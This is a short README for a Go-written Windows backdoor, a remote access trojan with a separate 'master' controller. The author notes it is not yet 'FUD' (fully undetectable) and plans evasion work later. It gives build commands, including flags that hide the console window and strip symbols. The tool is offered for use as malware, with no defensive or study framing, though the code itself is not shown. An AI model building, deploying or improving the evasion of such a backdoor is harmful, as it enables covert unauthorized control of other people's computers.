# golang-not-stealthy-backdoor
This is a backdoor created with golang its not FUD will be working on it later

## compiling and running
to compile just **_run make in the folder where the Makefile is located_** or if you dont have a make run **_go build -ldflags="-s -w -H=windowsgui" advancedrat.go_** and for the master **_go build -ldflags="-s -w" master.go_**

## supported platform
The RAT only works on windows platforms (x64) but the master can be compiled and run from anywhere
